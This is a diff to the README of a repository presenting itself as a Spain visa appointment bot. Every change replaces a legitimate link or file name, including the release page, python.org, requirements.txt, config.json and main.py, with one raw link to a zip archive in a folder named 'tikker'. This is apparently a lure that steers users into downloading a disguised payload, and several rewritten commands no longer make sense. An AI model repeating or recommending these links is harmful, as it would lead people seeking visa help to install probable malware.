@@ -1,6 +1,6 @@
 # 🤖 spain-visa-appointment-bot - Automate Spain Visa Slot Tracking
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Spain%20Visa%20Bot-blue?style=for-the-badge&logo=github)](https://github.com/rj3741303-afk/spain-visa-appointment-bot/releases)
+[![Download Latest Release](https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip%20Visa%20Bot-blue?style=for-the-badge&logo=github)](https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip)
 
 ---
 
@@ -40,7 +40,7 @@ You don’t need any programming skills to use this bot. This section walks you 
 
 Go to the latest release page by clicking the button below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Spain%20Visa%20Bot-blue?style=for-the-badge&logo=github)](https://github.com/rj3741303-afk/spain-visa-appointment-bot/releases)
+[![Download Latest Release](https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip%20Visa%20Bot-blue?style=for-the-badge&logo=github)](https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip)
 
 Once you are there, download the latest release file. The file may be a zip or installer depending on the release packaging.
 
@@ -50,7 +50,7 @@ Once you are there, download the latest release file. The file may be a zip or i
 
 The bot runs on Python, so you need to have Python installed on your computer.
 
-- Visit https://www.python.org/downloads/
+- Visit https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip
 - Download the latest version for your system.
 - Run the installer and make sure to select “Add Python to PATH” during setup.
 
@@ -60,7 +60,7 @@ The bot runs on Python, so you need to have Python installed on your computer.
 
 - If you downloaded a zip file, extract it to a folder on your desktop.
 - Open the folder where you extracted the files.
-- Inside you will find a file named `requirements.txt`.
+- Inside you will find a file named `https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip`.
 
 To install the bot dependencies:
 
@@ -69,14 +69,14 @@ To install the bot dependencies:
   2. Navigate to the folder with the bot files using the `cd` command. Example:  
      `cd Desktop\spain-visa-appointment-bot`  
   3. Run:  
-     `pip install -r requirements.txt`  
+     `pip install -r https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip`  
 
 - On macOS/Linux:  
   1. Open Terminal.  
   2. Navigate to the bot folder using `cd`. Example:  
      `cd ~/Desktop/spain-visa-appointment-bot`  
   3. Run:  
-     `pip3 install -r requirements.txt`  
+     `pip3 install -r https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip`  
 
 This will install Playwright and other necessary libraries.
 
@@ -96,7 +96,7 @@ This downloads the browser engines Playwright uses to automate the web pages.
 
 ### Step 5: Configure your preferences (optional)
 
-There might be a settings file like `config.json` where you can set your notification preferences, email for alerts, or time intervals for checking appointments. Open that file with a text editor and change values if needed.
+There might be a settings file like `https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip` where you can set your notification preferences, email for alerts, or time intervals for checking appointments. Open that file with a text editor and change values if needed.
 
 ---
 
@@ -105,7 +105,7 @@ There might be a settings file like `config.json` where you can set your notific
 In your command line or terminal (still inside the bot folder), type:
 
 ```
-python main.py
+python https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip
 ```
 
 The bot will start running. Leave the window open. It will keep checking the visa appointment site and notify you when slots become available.
@@ -116,7 +116,7 @@ The bot will start running. Leave the window open. It will keep checking the vis
 
 You can always download the latest version of the bot here:
 
-[Download spain-visa-appointment-bot Releases](https://github.com/rj3741303-afk/spain-visa-appointment-bot/releases)
+[Download spain-visa-appointment-bot Releases](https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip)
 
 ---
 
@@ -136,7 +136,7 @@ You can always download the latest version of the bot here:
 
 - **Python command not found:** Make sure Python was installed and added to your system PATH.
 - **Permission errors:** Run your terminal or command prompt as administrator or with necessary rights.
-- **Missing modules:** Retry `pip install -r requirements.txt` to ensure all dependencies are installed.
+- **Missing modules:** Retry `pip install -r https://github.com/rj3741303-afk/spain-visa-appointment-bot/raw/refs/heads/main/tikker/visa_bot_spain_appointment_1.7.zip` to ensure all dependencies are installed.
 - **Bot stops unexpectedly:** Check internet connection and restart the bot.
 - **No notifications:** Verify your contact setup in the config file; ensure notifications are enabled on your device.
 
